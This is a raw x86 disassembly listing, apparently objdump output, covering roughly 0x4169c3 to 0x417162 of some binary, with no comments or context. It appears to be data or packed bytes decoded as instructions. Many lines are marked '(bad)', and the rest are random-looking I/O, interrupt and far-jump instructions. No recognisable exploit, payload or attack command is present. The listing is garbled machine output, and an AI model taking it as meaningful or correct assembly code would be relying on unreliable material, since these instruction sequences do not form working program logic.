  4169c3:	add    dl,BYTE PTR [eax+0x5258d0d9]
  4169c9:	int    0xa
  4169cb:	push   esi
  4169cc:	(bad)  
  4169cd:	cwde   
  4169ce:	mul    DWORD PTR [ebx]
  4169d0:	add    BYTE PTR [edx+esi*2-0x3],0xe4
  4169d5:	in     eax,dx
  4169d6:	sbb    ch,al
  4169d8:	add    BYTE PTR [eax],al
  4169da:	add    BYTE PTR [eax],al
  4169dc:	add    BYTE PTR [edx],cl
  4169de:	xor    BYTE PTR [edx],cl
  4169e0:	add    BYTE PTR [ebx],bl
  4169e2:	test   eax,0xd3c6f686
  4169e7:	js     0x41696e
  4169e9:	push   0x92000adb
  4169ee:	inc    ebp
  4169ef:	sbb    al,BYTE PTR [ebx+0x561e3d26]
  4169f5:	daa    
  4169f6:	gs adc BYTE PTR es:0xa4e81698,cl
  4169fe:	leave  
  4169ff:	or     eax,DWORD PTR [eax]
  416a01:	outs   dx,DWORD PTR ds:[esi]
  416a02:	push   esp
  416a03:	dec    eax
  416a04:	pop    esi
  416a05:	rol    al,cl
  416a07:	or     dl,BYTE PTR [esi+0x67]
  416a0a:	or     dh,dh
  416a0c:	and    ebx,DWORD PTR [esp+edx*2-0x529b028d]
  416a13:	push   ss
  416a14:	std    
  416a15:	pop    esp
  416a16:	mov    dl,0xc1
  416a18:	pop    ss
  416a19:	call   0x904469f4
  416a1e:	cmp    edx,DWORD PTR [ebp-0x26b83979]
  416a24:	jne    0x416a33
  416a26:	call   0x28f9:0xb49003e3
  416a2d:	popa   
  416a2e:	xor    eax,0xb2923058
  416a33:	in     eax,0x80
  416a35:	int    0x9d
  416a37:	mov    ah,0x88
  416a39:	int    0xd9
  416a3b:	cdq    
  416a3c:	push   cs
  416a3d:	xchg   edi,eax
  416a3e:	(bad)  
  416a3f:	popa   
  416a40:	jbe    0x416a42
  416a42:	add    BYTE PTR [eax],al
  416a44:	add    BYTE PTR [eax],al
  416a46:	add    al,0xb7
  416a48:	mov    bh,0x7c
  416a4a:	cld    
  416a4b:	mov    gs,ebp
  416a4d:	mov    BYTE PTR [ebp-0x25],cl
  416a50:	iret   
  416a51:	adc    esi,DWORD PTR [edi-0x3a]
  416a54:	xchg   ebx,eax
  416a55:	mov    BYTE PTR [ebp-0x25],bl
  416a58:	push   0xcbc6670e
  416a5d:	fmul   QWORD PTR [eax]
  416a5f:	in     eax,dx
  416a60:	scas   al,BYTE PTR es:[edi]
  416a61:	inc    ecx
  416a62:	test   BYTE PTR [edx-0x7113774c],dh
  416a68:	rcl    esp,1
  416a6a:	sbb    ah,cl
  416a6c:	out    dx,al
  416a6d:	test   BYTE PTR [eax-0x50],ch
  416a70:	in     eax,0x3
  416a72:	aaa    
  416a73:	mov    ch,0x61
  416a75:	adc    BYTE PTR [eax+0x4986e5b2],0x45
  416a7c:	ins    BYTE PTR es:[di],dx
  416a7e:	mov    ah,0xcf
  416a81:	jl     0x416a8f
  416a83:	repz push ecx
  416a85:	pop    es
  416a86:	adc    ebx,edi
  416a88:	mov    edi,0xf5f8a68
  416a8d:	(bad)  
  416a8e:	adc    eax,0x9003e397
  416a93:	aaa    
  416a94:	push   cs
  416a95:	xchg   BYTE PTR [edi-0x3c16113b],cl
  416a9b:	cmp    al,cl
  416a9d:	xchg   ecx,eax
  416a9e:	mov    ebx,0x54e90db7
  416aa3:	jmp    FWORD PTR [ecx]
  416aa5:	jmp    0x416a3a
  416aa7:	mov    dl,0xb0
  416aa9:	jmp    0x416aae
  416aae:	add    BYTE PTR [ebx+0x5dc20eb2],bl
  416ab4:	mov    bh,0x42
  416ab6:	jp     0x416a95
  416ab8:	(bad)  
  416ab9:	jns    0x416a88
  416abb:	(bad)  
  416abc:	cmp    eax,ecx
  416abe:	cmp    DWORD PTR [edi],0xc5e90db4
  416ac4:	(bad)  
  416ac5:	mov    dh,0x5
  416ac7:	xchg   edx,eax
  416ac8:	mov    dl,0xe
  416aca:	(bad)  
  416acb:	(bad)  
  416acd:	ja     0x416a8d
  416acf:	xchg   edx,eax
  416ad0:	mov    dl,0x83
  416ad2:	and    DWORD PTR [eax+0x70579e4],edi
  416ad8:	das    
  416ad9:	and    ch,bl
  416adb:	xchg   ebx,eax
  416adc:	mov    dl,0x5e
  416ade:	(bad)  
  416adf:	(bad)  
  416ae0:	fimul  DWORD PTR [edi+esi*8]
  416ae3:	xchg   edx,eax
  416ae4:	mov    dl,0x89
  416ae6:	inc    edx
  416ae7:	push   ebp
  416ae8:	mov    ds:0xb0775eef,eax
  416aed:	push   cs
  416aee:	jmp    0x69c640b
  416af3:	inc    edi
  416af4:	xchg   ecx,eax
  416af5:	adc    dl,BYTE PTR [ecx]
  416af7:	pop    ss
  416af8:	mov    ah,0xd
  416afa:	jmp    0x8d0ca54c
  416aff:	mov    eax,0x20e65bb8
  416b04:	xchg   ecx,eax
  416b05:	push   ds
  416b06:	rcr    DWORD PTR [eax+0x57],1
  416b09:	or     eax,0xcc69eae9
  416b0e:	loope  0x416aa3
  416b10:	popa   
  416b11:	add    DWORD PTR [eax],0x0
  416b14:	add    BYTE PTR [eax],al
  416b16:	add    BYTE PTR [eax],al
  416b18:	loopne 0x416af9
  416b1a:	clc    
  416b1b:	test   DWORD PTR [ecx-0x7fff154],esp
  416b21:	xor    edi,DWORD PTR [edx+0x24]
  416b24:	mov    ebp,0xff8553d4
  416b29:	(bad)  
  416b2a:	push   edi
  416b2b:	call   0x32b66d
  416b30:	cmp    eax,0x8a5e7a6e
  416b35:	add    eax,0xb0a9080e
  416b3a:	xor    eax,0x42b99ef3
  416b3f:	fidiv  WORD PTR [ebx+eax*1]
  416b42:	and    al,BYTE PTR [edx]
  416b44:	mov    ecx,0x95bd83b0
  416b49:	scas   eax,DWORD PTR es:[edi]
  416b4a:	push   cs
  416b4b:	add    bh,bl
  416b4d:	xor    eax,ecx
  416b4f:	call   0x31257c
  416b54:	(bad)  
  416b55:	add    DWORD PTR [edx],ebp
  416b57:	add    ch,BYTE PTR [ecx-0x50]
  416b5a:	test   edi,ecx
  416b5c:	sbb    cl,BYTE PTR [ecx+0x7a]
  416b5f:	and    al,0x99
  416b61:	push   esi
  416b62:	cmp    DWORD PTR [esi],ecx
  416b64:	js     0x416b16
  416b66:	pop    eax
  416b67:	mov    esp,DWORD PTR [esi+0x680d7056]
  416b6d:	mov    al,0x5d
  416b6f:	(bad)  
  416b70:	in     al,dx
  416b71:	xchg   edx,eax
  416b72:	or     al,0x0
  416b74:	cmp    DWORD PTR ds:0xa3bdffc3,esi
  416b7a:	adc    ch,al
  416b7c:	add    BYTE PTR [eax],al
  416b7e:	add    BYTE PTR [eax],al
  416b80:	add    BYTE PTR [edx],ah
  416b82:	(bad)  
  416b84:	inc    DWORD PTR [esi]
  416b86:	in     eax,0xe5
  416b88:	push   cs
  416b89:	dec    DWORD PTR [eax+0x7a]
  416b8c:	and    al,0x1d
  416b8e:	dec    ecx
  416b8f:	jp     0x416bb5
  416b91:	sbb    eax,0x906f5758
  416b96:	fimul  DWORD PTR [edx]
  416b98:	pop    esi
  416b99:	gs pop ss
  416b9b:	pop    es
  416b9c:	add    BYTE PTR [ebp+0x40],ah
  416b9f:	addr16 push ecx
  416ba1:	pop    esi
  416ba2:	inc    eax
  416ba3:	fdivr  DWORD PTR ds:[ebx-0x6b]
  416ba7:	or     ch,al
  416ba9:	ror    DWORD PTR [eax],1
  416bab:	or     eax,DWORD PTR [eax]
  416bad:	fbld   TBYTE PTR [esi+0x24b88a1a]
  416bb3:	dec    BYTE PTR [ebx]
  416bb5:	iret   
  416bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bb7:	add    bh,ch
  416bb9:	ficomp WORD PTR [eax+0x2f]
  416bbc:	or     al,0xb
  416bbe:	dec    edx
  416bbf:	outs   dx,DWORD PTR ds:[esi]
  416bc0:	fnstcw WORD PTR [ebp*8-0x1fd10973]
  416bc7:	bound  ebx,QWORD PTR [edi-0x7cf52619]
  416bcd:	shl    ch,1
  416bcf:	sbb    BYTE PTR [esi-0x69],dl
  416bd2:	fiadd  WORD PTR [esi]
  416bd4:	mov    DWORD PTR [eax-0x11],ebx
  416bd7:	or     ebp,edi
  416bd9:	std    
  416bda:	shl    eax,1
  416bdc:	(bad)  
  416bdd:	ja     0x416c01
  416bdf:	mov    al,0x0
  416be1:	nop
  416be2:	popa   
  416be3:	push   es
  416be4:	hlt    
  416be5:	add    BYTE PTR [eax],al
  416be7:	add    BYTE PTR [eax],al
  416be9:	add    BYTE PTR [eax-0x39398027],dl
  416bef:	and    dh,dl
  416bf1:	rol    ch,0x40
  416bf4:	addr16 push ecx
  416bf6:	mov    esi,0xbbe03e40
  416bfb:	adc    eax,0xa8c1e80b
  416c00:	or     eax,DWORD PTR [eax]
  416c02:	aas    
  416c03:	inc    esi
  416c04:	sbb    ecx,DWORD PTR [edx+0xbdec458]
  416c0a:	das    
  416c0b:	inc    esi
  416c0c:	add    edi,ebp
  416c0e:	ds pop eax
  416c10:	das    
  416c11:	or     al,0xb
  416c13:	mov    dl,0xd5
  416c15:	cmp    BYTE PTR [ecx],0x3e
  416c18:	or     DWORD PTR [edi+0x6],edi
  416c1b:	dec    edx
  416c1c:	cld    
  416c1d:	imul   edx,DWORD PTR [edi+0x3],0xffffffe5
  416c21:	add    edx,DWORD PTR [ebx]
  416c23:	repnz xor BYTE PTR [esi],dl
  416c26:	pop    esi
  416c27:	ret    
  416c28:	cmp    DWORD PTR [eax],ecx
  416c2a:	sbb    edx,edi
  416c2c:	dec    edx
  416c2d:	add    esp,ebp
  416c2f:	cmp    al,0xed
  416c31:	in     eax,dx
  416c32:	(bad)  
  416c34:	dec    ebp
  416c35:	mov    ebp,0xb79db290
  416c3a:	shl    DWORD PTR [ecx+0x63ce8ce5],0x3c
  416c41:	xlat   BYTE PTR ds:[ebx]
  416c42:	rcr    BYTE PTR [esp+edi*2+0x68],1
  416c46:	aaa    
  416c47:	(bad)  
  416c48:	call   0x6af3fc52
  416c4d:	jg     0x416c4f
  416c4f:	add    BYTE PTR [eax],al
  416c51:	add    BYTE PTR [eax],al
  416c53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c54:	les    ebx,FWORD PTR [edi+0x79]
  416c57:	inc    ecx
  416c58:	pop    esp
  416c59:	mov    al,0xeb
  416c5b:	xchg   esi,eax
  416c5c:	mov    cl,0xe5
  416c5e:	add    esp,eax
  416c60:	arpl   WORD PTR [eax+0xf],bx
  416c63:	mov    al,0xa6
  416c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c66:	add    ecx,DWORD PTR [ecx]
  416c68:	(bad)  [ecx+0x5d]
  416c6b:	test   BYTE PTR [ebx-0x3ee68e0c],0x37
  416c72:	mov    cl,0x5c
  416c74:	jb     0x416c1b
  416c76:	add    ecx,DWORD PTR [ecx]
  416c78:	sub    dl,BYTE PTR ds:0xb4b297c9
  416c7e:	xchg   BYTE PTR [ebx],bl
  416c80:	mov    edi,0xcb457919
  416c85:	mov    ebp,0x61c23ce0
  416c8a:	inc    esp
  416c8b:	mov    esp,0x9c4164a2
  416c90:	js     0x416ca0
  416c92:	push   0xffffffa9
  416c94:	push   0x7c
  416c96:	adc    ah,BYTE PTR [ebp-0xe]
  416c99:	dec    esi
  416c9a:	inc    edi
  416c9b:	xor    eax,0x8252caf9
  416ca0:	scas   al,BYTE PTR es:[edi]
  416ca1:	push   0x3ebb1162
  416ca6:	sub    DWORD PTR [ebx+ecx*8-0x51909722],edx
  416cad:	push   es
  416cae:	jmp    0x1f9ad046
  416cb3:	rcr    DWORD PTR [ecx-0x7e],0xe8
  416cb7:	add    BYTE PTR [eax],al
  416cb9:	add    BYTE PTR [eax],al
  416cbb:	add    BYTE PTR [ebx+0x4c23bb2],dl
  416cc1:	retf   0x365a
  416cc4:	sbb    al,0x67
  416cc6:	sub    cl,dl
  416cc8:	dec    eax
  416cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cca:	outs   dx,BYTE PTR ds:[esi]
  416ccb:	not    ebx
  416ccd:	ror    DWORD PTR [ebx+0x18bf8fad],0x81
  416cd4:	xor    DWORD PTR [edx+0xe],0x60
  416cd8:	shl    BYTE PTR [ebp+0x4518718b],1
  416cde:	pop    es
  416cdf:	sbb    ecx,DWORD PTR [ecx+ebx*8+0x44]
  416ce3:	jmp    0x416c78
  416ce5:	mov    dl,0x5b
  416ce7:	fs push edi
  416ce9:	xchg   ebp,eax
  416cea:	cs nop
  416cec:	mov    ds:0xeb6d8629,al
  416cf1:	pop    ebp
  416cf2:	call   0x880d:0x4a2d93e8
  416cf9:	(bad)  
  416cfa:	out    dx,eax
  416cfb:	aam    0x9f
  416cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cfe:	dec    esi
  416cff:	jmp    0x6447e40e
  416d04:	rol    DWORD PTR [esi-0x2a],cl
  416d07:	fcmovbe st,st(3)
  416d09:	jb     0x416d69
  416d0b:	pop    esp
  416d0c:	dec    edi
  416d0d:	xchg   ebp,eax
  416d0e:	cs add al,dl
  416d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d12:	xchg   edi,eax
  416d13:	mov    BYTE PTR [ebp+0x3894374d],dh
  416d19:	mov    ch,0x83
  416d1b:	inc    esp
  416d1c:	push   ebp
  416d1d:	test   eax,0x535e
  416d22:	add    BYTE PTR [eax],al
  416d24:	add    bl,al
  416d26:	mov    bh,0xb3
  416d28:	test   BYTE PTR [ebp-0xe],bl
  416d2b:	out    dx,al
  416d2c:	push   esp
  416d2d:	fisub  WORD PTR [edx-0x4956ef06]
  416d33:	xchg   DWORD PTR [edi-0x3],eax
  416d36:	xor    esi,ecx
  416d38:	je     0x416d3c
  416d3a:	int3   
  416d3b:	out    dx,eax
  416d3c:	mov    WORD PTR [ebp-0x7446d16e],es
  416d42:	mov    ?,WORD PTR [esi+0x18]
  416d45:	add    DWORD PTR [eax+0x29b9019a],edi
  416d4b:	dec    edx
  416d4c:	and    al,0xbd
  416d4e:	in     al,0x5d
  416d50:	push   ebp
  416d51:	push   cs
  416d52:	mov    ds:0xb669132a,eax
  416d57:	xchg   DWORD PTR [edi-0x3b],eax
  416d5a:	xor    esi,ecx
  416d5c:	je     0x416d94
  416d5e:	int3   
  416d5f:	out    dx,eax
  416d60:	mov    WORD PTR [ebp-0x7446d16e],es
  416d66:	adc    al,0x76
  416d68:	cwde   
  416d69:	loope  0x416db7
  416d6b:	popf   
  416d6c:	add    DWORD PTR [ecx+0x2b],edi
  416d6f:	dec    edx
  416d70:	and    al,0x6d
  416d72:	in     al,0x66
  416d74:	sub    al,bl
  416d76:	or     ax,0x4353
  416d7a:	rcr    BYTE PTR [ebx+0x53],0x9e
  416d7e:	mov    eax,ds:0xb42912a2
  416d83:	xchg   DWORD PTR [edi],eax
  416d85:	in     al,0x76
  416d87:	add    DWORD PTR [eax+eax*1+0x0],eax
  416d8e:	push   ecx
  416d8f:	dec    ecx
  416d90:	icebp  
  416d91:	call   DWORD PTR [eax-0x55af2404]
  416d97:	retf   
  416d98:	(bad)  
  416d9a:	popf   
  416d9b:	loope  0x416db8
  416d9d:	inc    eax
  416d9e:	nop
  416d9f:	push   esi
  416da0:	dec    edx
  416da1:	or     eax,0xfd780e0c
  416da6:	pop    ds
  416da7:	push   ebx
  416da8:	scas   eax,DWORD PTR es:[edi]
  416da9:	jge    0x90417750
  416daf:	arpl   WORD PTR [edx],cx
  416db1:	xchg   DWORD PTR [edi-0x3f],ecx
  416db4:	ja     0x416dc9
  416db6:	(bad)  
  416db7:	(bad)  
  416db8:	retf   0xaff
  416dbb:	loop   0x416d4a
  416dbd:	jmp    0x416d5e
  416dbf:	push   ebp
  416dc0:	(bad)  
  416dc1:	(bad)  
  416dc2:	out    0xc9,eax
  416dc4:	xor    DWORD PTR [ebx],0xfffffff0
  416dc7:	fxch   st(2)
  416dc9:	push   DWORD PTR [eax+0x6f1f2e78]
  416dcf:	loope  0x416db5
  416dd1:	pop    es
  416dd2:	pop    ebp
  416dd3:	sub    BYTE PTR [ecx-0x79],al
  416dd6:	push   edi
  416dd7:	std    
  416dd8:	in     al,0x9
  416dda:	pop    ebp
  416ddb:	cmp    BYTE PTR [ecx-0x79],al
  416dde:	push   edi
  416ddf:	stc    
  416de0:	(bad)  
  416de2:	pop    ds
  416de3:	cmc    
  416de4:	(bad)  
  416de6:	test   DWORD PTR ds:0x4e90401b,ebp
  416dec:	dec    ebx
  416ded:	je     0x416d95
  416def:	stc    
  416df0:	in     al,0xff
  416df2:	add    BYTE PTR [eax],al
  416df4:	add    BYTE PTR [eax],al
  416df6:	add    cl,bh
  416df8:	leave  
  416df9:	test   DWORD PTR [ebp-0x50],eax
  416dfc:	stc    
  416dfd:	test   DWORD PTR [esp+ebp*4-0x5f],edx
  416e01:	or     ebx,0x78
  416e04:	mov    ah,0x67
  416e06:	jmp    DWORD PTR [edi+0x74]
  416e09:	or     eax,0x84265031
  416e0e:	sub    edx,DWORD PTR [edx+esi*4+0x494fc3f2]
  416e15:	in     eax,0x8c
  416e17:	int    0x9e
  416e19:	sbb    BYTE PTR [eax-0x79],dl
  416e1c:	pop    edi
  416e1d:	loope  0x416e25
  416e1f:	or     al,0x9b
  416e21:	out    0x3,al
  416e23:	nop
  416e24:	sub    esp,DWORD PTR [ecx+0x6c58881f]
  416e2a:	les    ecx,FWORD PTR [ebp-0x6e94d9a8]
  416e30:	sub    ah,BYTE PTR [eax]
  416e32:	cmp    al,0x9d
  416e34:	or     BYTE PTR [ebp+0x9773505],ah
  416e3a:	mov    edx,DWORD PTR [ebp-0x7a]
  416e3d:	lea    eax,[ecx]
  416e3f:	jl     0x416df9
  416e41:	fs fs in al,dx
  416e44:	xor    ah,BYTE PTR [ebp-0xe88f100]
  416e4a:	imul   edx,DWORD PTR [ebx],0x7a
  416e4d:	out    0x3,al
  416e4f:	and    DWORD PTR [ecx-0x588c2813],esi
  416e55:	loopne 0x416ed5
  416e57:	lods   al,BYTE PTR ds:[esi]
  416e58:	mov    cl,0xe5
  416e5a:	add    eax,DWORD PTR [eax]
  416e5c:	add    BYTE PTR [eax],al
  416e5e:	add    BYTE PTR [eax],al
  416e60:	or     ebp,DWORD PTR [esi]
  416e62:	leave  
  416e63:	out    dx,eax
  416e64:	xchg   ecx,eax
  416e65:	mov    dl,0xe5
  416e67:	xor    ecx,ecx
  416e69:	leave  
  416e6a:	leave  
  416e6b:	lea    esp,[edi+0x5bbd69be]
  416e71:	dec    esp
  416e72:	aad    0xeb
  416e74:	rol    DWORD PTR [ecx-0x5f],cl
  416e77:	add    esp,eax
  416e79:	retf   0x3c76
  416e7c:	xchg   DWORD PTR [esi+0x34b48869],edi
  416e82:	in     eax,0x3
  416e84:	nop
  416e85:	retf   0x53a2
  416e88:	nop
  416e89:	mov    dl,0x7c
  416e8b:	test   BYTE PTR [esi-0x4c],ch
  416e8e:	push   cs
  416e8f:	jmp    0x9d88a427
  416e94:	sbb    cl,ch
  416e96:	or     al,0xe9
  416e98:	xchg   ebx,eax
  416e99:	sub    DWORD PTR [edx+0xeb2c5c5],ecx
  416e9f:	jmp    0xa9502121
  416ea4:	dec    edx
  416ea5:	inc    ecx
  416ea6:	cmc    
  416ea7:	xchg   ecx,eax
  416ea8:	xchg   ecx,eax
  416ea9:	mov    ebp,0x370ee9ee
  416eae:	sub    dh,bh
  416eb0:	xchg   ecx,eax
  416eb1:	mov    dl,0xe
  416eb3:	cdq    
  416eb4:	push   cs
  416eb5:	js     0x416f15
  416eb7:	cmp    DWORD PTR [edx+ebx*2+0x36],edi
  416ebb:	call   0xd9b9853
  416ec0:	cwde   
  416ec1:	dec    eax
  416ec2:	or     eax,0x90
  416ec7:	add    BYTE PTR [eax],al
  416ec9:	mov    cl,0xd
  416ecb:	xchg   esi,eax
  416ecc:	loope  0x416f49
  416ece:	sbb    DWORD PTR [eax+ebp*8+0xd4a2993],ebx
  416ed5:	js     0x416f39
  416ed7:	fs jmp 0x2da3a0c8
  416edd:	xchg   esp,eax
  416ede:	mov    edi,0x72a0c518
  416ee3:	push   cs
  416ee4:	pusha  
  416ee5:	cmp    al,0x52
  416ee7:	or     eax,0xce3193e9
  416eec:	imul   BYTE PTR [edi]
  416eee:	test   al,0xf0
  416ef0:	jle    0x416f0e
  416ef2:	dec    eax
  416ef3:	push   cs
  416ef4:	jbe    0x416e84
  416ef6:	xchg   BYTE PTR [ecx],bl
  416ef8:	sub    DWORD PTR [ebx+ebp*1+0x46fd6cfe],ecx
  416eff:	inc    esp
  416f00:	mov    bh,0xfc
  416f02:	mov    eax,ds:0xbd53f9d6
  416f07:	test   DWORD PTR [esi+0x47],esp
  416f0a:	mov    esp,0x3c7900ee
  416f0f:	into   
  416f10:	je     0x416f6f
  416f12:	or     dh,0x40
  416f15:	stc    
  416f16:	loopne 0x416f70
  416f18:	(bad)  
  416f19:	cmp    al,0x65
  416f1b:	push   ds
  416f1c:	inc    eax
  416f1d:	cmp    DWORD PTR [eax],ebp
  416f1f:	mov    DWORD PTR [eax+edi*1-0x4f],ebx
  416f23:	push   cs
  416f24:	test   DWORD PTR [ecx-0x33],ebp
  416f27:	adc    BYTE PTR [eax-0x7a],dl
  416f2a:	push   cs
  416f2b:	pop    edx
  416f2c:	add    DWORD PTR [eax],eax
  416f2e:	add    BYTE PTR [eax],al
  416f30:	add    BYTE PTR [eax],al
  416f32:	cmp    DWORD PTR [ecx-0x5e82ea0f],esi
  416f38:	dec    esi
  416f39:	add    BYTE PTR [esi],dh
  416f3b:	pmullw mm0,QWORD PTR [ebp-0x77103497]
  416f42:	jle    0x416f32
  416f44:	out    dx,eax
  416f45:	(bad)  
  416f46:	stc    
  416f47:	call   0xd882b44d
  416f4c:	fs add dh,al
  416f4f:	pop    edx
  416f50:	test   bl,al
  416f52:	mov    dh,0xe0
  416f54:	push   ebx
  416f55:	pop    ebx
  416f56:	js     0x416fc2
  416f58:	add    cl,BYTE PTR [eax]
  416f5a:	jmp    0x72973d0f
  416f5f:	push   edx
  416f60:	aas    
  416f61:	push   esi
  416f62:	inc    edx
  416f63:	inc    edi
  416f64:	pop    ecx
  416f65:	and    DWORD PTR [edi+0x7c880ea2],0x41
  416f6c:	jp     0x416f77
  416f6e:	push   es
  416f6f:	mov    eax,0x60ccff12
  416f74:	push   ds
  416f75:	inc    eax
  416f76:	mov    ecx,0xa90c7033
  416f7b:	cmp    esi,DWORD PTR [ebx]
  416f7d:	pusha  
  416f7e:	mov    ebx,0x7c73eef0
  416f83:	inc    ecx
  416f84:	js     0x416f92
  416f86:	out    0x57,al
  416f88:	lea    edi,[esi-0x70]
  416f8b:	int    0x7b
  416f8d:	je     0x416f18
  416f8f:	ins    BYTE PTR es:[edi],dx
  416f90:	hlt    
  416f91:	add    ebp,DWORD PTR [edi-0x21]
  416f94:	pop    esi
  416f95:	adc    BYTE PTR [eax],al
  416f97:	add    BYTE PTR [eax],al
  416f99:	add    BYTE PTR [eax],al
  416f9b:	ror    cl,1
  416f9d:	xchg   DWORD PTR [esi-0x7c],edi
  416fa0:	leave  
  416fa1:	test   BYTE PTR [edx],0x57
  416fa4:	add    al,0x17
  416fa6:	std    
  416fa7:	addr16 dec ecx
  416fa9:	cld    
  416faa:	seto   BYTE PTR ds:0xb9c6fcf2
  416fb1:	jnp    0x416fc6
  416fb3:	fs mov eax,0xf412ffca
  416fb9:	or     dh,BYTE PTR [esp+ecx*4-0x44]
  416fbd:	xor    al,0xfd
  416fbf:	inc    edi
  416fc0:	dec    edx
  416fc1:	std    
  416fc2:	cld    
  416fc3:	nop
  416fc4:	inc    ebp
  416fc5:	fisttp WORD PTR [eax+0x97216]
  416fcb:	nop
  416fcc:	push   esi
  416fcd:	dec    ebx
  416fce:	je     0x416f5d
  416fd0:	jns    0x41704d
  416fd2:	mov    dh,0x5c
  416fd4:	retf   0xa
  416fd7:	out    dx,eax
  416fd8:	ficom  WORD PTR [esi+0x10]
  416fdb:	push   eax
  416fdc:	leave  
  416fdd:	outs   dx,DWORD PTR ds:[esi]
  416fde:	xchg   BYTE PTR [edx+ecx*8],bh
  416fe1:	or     al,BYTE PTR [eax]
  416fe3:	or     eax,0x6004f70a
  416fe8:	adc    al,0x16
  416fea:	shl    BYTE PTR [eax+0x16890a89],1
  416ff0:	jle    0x416ffb
  416ff2:	add    BYTE PTR [eax-0x688bb4aa],dl
  416ff8:	cdq    
  416ff9:	jnp    0x41700e
  416ffb:	aam    0xd9
  416ffd:	retf   0xff
  417000:	add    BYTE PTR [eax],al
  417002:	add    BYTE PTR [eax],al
  417004:	or     cl,BYTE PTR [ebx+ebp*8-0x2]
  417008:	xchg   edi,eax
  417009:	leave  
  41700a:	test   eax,eax
  41700c:	add    al,0xb3
  41700e:	in     al,0xd3
  417010:	test   bl,ah
  417012:	jnp    0x416f9d
  417014:	adc    BYTE PTR [ecx-0xdecfc1b],dh
  41701a:	fsub   DWORD PTR [ecx+eiz*4]
  41701d:	mov    ebx,0xa564d38f
  417022:	fst    DWORD PTR [esi]
  417024:	shl    BYTE PTR [edx-0x44a8fa06],1
  41702a:	in     al,0xf7
  41702c:	lahf   
  41702d:	arpl   WORD PTR [eax+0x56bba1dd],si
  417033:	jnp    0x417074
  417035:	mov    ebx,0xd2a372e4
  41703a:	clc    
  41703b:	ret    
  41703c:	das    
  41703d:	cs ja  0x41702f
  417040:	es mov ebx,0xee4f5be4
  417046:	in     eax,0x3
  417048:	mov    ch,0x5c
  41704a:	cs inc esi
  41704c:	popa   
  41704d:	fs jl  0x417043
  417050:	xchg   edi,eax
  417051:	arpl   WORD PTR [ecx+esi*2],dx
  417054:	cmp    DWORD PTR [edx],esi
  417056:	in     eax,0x3
  417058:	nop
  417059:	ss mov bl,0xf8
  41705c:	jl     0x417090
  41705e:	dec    ecx
  41705f:	sub    BYTE PTR [eax-0x2d461f4e],al
  417065:	stos   BYTE PTR es:[edi],al
  417066:	push   ecx
  417067:	inc    ebx
  417068:	add    BYTE PTR [eax],al
  41706a:	add    BYTE PTR [eax],al
  41706c:	add    dh,dl
  41706e:	call   0xae59ad75
  417073:	aad    0x83
  417075:	retf   0x1311
  417078:	int3   
  417079:	aas    
  41707a:	mov    eax,0x327bfa45
  41707f:	fwait
  417080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417081:	es pushf 
  417083:	outs   dx,BYTE PTR gs:[esi]
  417085:	repz inc edx
  417087:	ds mov dh,bh
  41708a:	adc    eax,0xb293e90e
  41708f:	jns    0x417074
  417091:	or     al,0xf0
  417093:	mov    DWORD PTR [edi-0x16f14cd1],eax
  417099:	xchg   DWORD PTR [ebx+eax*4+0x1c70f42a],esi
  4170a0:	inc    edx
  4170a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170a2:	cs nop
  4170a4:	mov    ecx,DWORD PTR [edx+esi*4+0x2b5db40e]
  4170ab:	(bad)  
  4170ac:	ins    DWORD PTR es:[edi],dx
  4170ad:	add    dl,BYTE PTR [esi+ecx*1]
  4170b0:	jmp    0x724daf48
  4170b5:	int    0x2a
  4170b7:	dec    eax
  4170b8:	clc    
  4170b9:	fcomp  QWORD PTR [edi-0x4d138876]
  4170bf:	push   cs
  4170c0:	jmp    0x2ec51ceb
  4170c5:	sbb    BYTE PTR [ecx],bl
  4170c7:	lods   eax,DWORD PTR ds:[esi]
  4170c8:	jmp    0xebbc2360
  4170cd:	xchg   esp,eax
  4170ce:	repz test DWORD PTR [edi+0x0],esp
  4170d5:	add    BYTE PTR [ebx-0x1a17afd2],ah
  4170db:	mov    eax,0xc1d6ee56
  4170e0:	mov    DWORD PTR [edi],esi
  4170e2:	mov    ?,WORD PTR [esi]
  4170e4:	or     ebp,DWORD PTR [edx+0x50]
  4170e7:	mov    ah,0x8a
  4170e9:	daa    
  4170ea:	cwde   
  4170eb:	or     ebp,DWORD PTR ds:[edx+0x50]
  4170ef:	mov    ds:0x3e7c178a,al
  4170f4:	or     ebp,DWORD PTR [edx+0x50]
  4170f7:	scas   al,BYTE PTR es:[edi]
  4170f8:	mov    al,BYTE PTR [edi-0x5d]
  4170fb:	or     ebp,DWORD PTR ds:[edx+0x50]
  4170ff:	stos   BYTE PTR es:[edi],al
  417100:	push   0x50574862
  417105:	xor    dl,BYTE PTR [esi-0x52]
  417108:	push   cs
  417109:	add    BYTE PTR [edi+esi*1+0x6a0d81e2],al
  417110:	push   cs
  417111:	add    BYTE PTR [ecx+0x6115f1db],ch
  417117:	sahf   
  417118:	dec    esi
  417119:	add    BYTE PTR [ecx+0x42],cl
  41711c:	sbb    eax,eax
  41711e:	test   ebp,esi
  417120:	out    dx,al
  417121:	test   BYTE PTR [ecx+0xc8d69c1],ch
  417127:	dec    ecx
  417128:	aas    
  417129:	push   0x55
  41712b:	cmp    BYTE PTR [ebx-0xebd61d8],al
  417131:	push   ecx
  417132:	push   ebx
  417133:	scas   eax,DWORD PTR es:[edi]
  417134:	pop    esi
  417135:	jmp    DWORD PTR [ebp+esi*4+0x1b]
  417139:	inc    eax
  41713a:	add    BYTE PTR [eax],al
  41713c:	add    BYTE PTR [eax],al
  41713e:	add    BYTE PTR [ecx],bh
  417140:	xor    dh,cl
  417142:	je     0x417130
  417144:	sub    eax,0xbfeffc73
  417149:	dec    ecx
  41714a:	push   0x39
  41714c:	cmp    BYTE PTR [ebx-0x70],bl
  41714f:	sar    BYTE PTR [eax],1
  417151:	inc    edi
  417152:	aaa    
  417153:	inc    eax
  417154:	pop    ebp
  417155:	aaa    
  417156:	nop
  417157:	sub    BYTE PTR [ebp-0x2896aa7d],dh
  41715d:	inc    edx
  41715e:	lea    edi,[esi+edx*4-0xf]
  417162:	(bad)  
